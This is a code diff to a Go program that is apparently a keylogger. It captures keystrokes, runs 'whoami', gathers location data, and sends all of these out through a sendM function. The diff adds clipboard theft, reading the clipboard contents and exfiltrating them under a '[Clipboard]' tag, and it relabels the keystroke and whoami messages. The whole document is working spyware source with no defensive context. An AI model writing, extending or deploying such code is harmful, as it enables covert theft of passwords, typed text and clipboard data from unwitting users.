@@ -9,6 +9,7 @@ import (
 	"os/exec"
 	"time"
 
+	"github.com/atotto/clipboard"
 	"github.com/eiannone/keyboard"
 )
 
@@ -23,6 +24,8 @@ func main() {
 	sendM(localisation())
 	version := system("whoami")
 	sendM(version)
+	sendM(StartClipboardMonitor())
+
 	err := keyboard.Open() // ouvrir le clavier
 	if err != nil {
 		log.Fatal(err)
@@ -33,7 +36,8 @@ func main() {
 		for {
 			time.Sleep(20 * time.Second)
 			if logs != "" {
-				sendM(logs)
+				keyentr := fmt.Sprintf("[Keyboard Entries] %s", logs)
+				sendM(keyentr)
 				logs = ""
 			}
 		}
@@ -72,9 +76,19 @@ func localisation() string {
 
 func system(cmdstr string) string {
 	cmd := exec.Command(cmdstr)
-	output, err := cmd.CombinedOutput()
+	out, err := cmd.CombinedOutput()
 	if err != nil {
 		log.Fatal(err)
 	}
+	output := fmt.Sprintf("[whoami] %s", out)
 	return string(output)
+}
+
+func StartClipboardMonitor() string {
+	clipboard, err := clipboard.ReadAll()
+	if err != nil {
+		log.Fatal(err)
+	}
+	clip := fmt.Sprintf("[Clipboard] %s", clipboard)
+	return string(clip)
 }
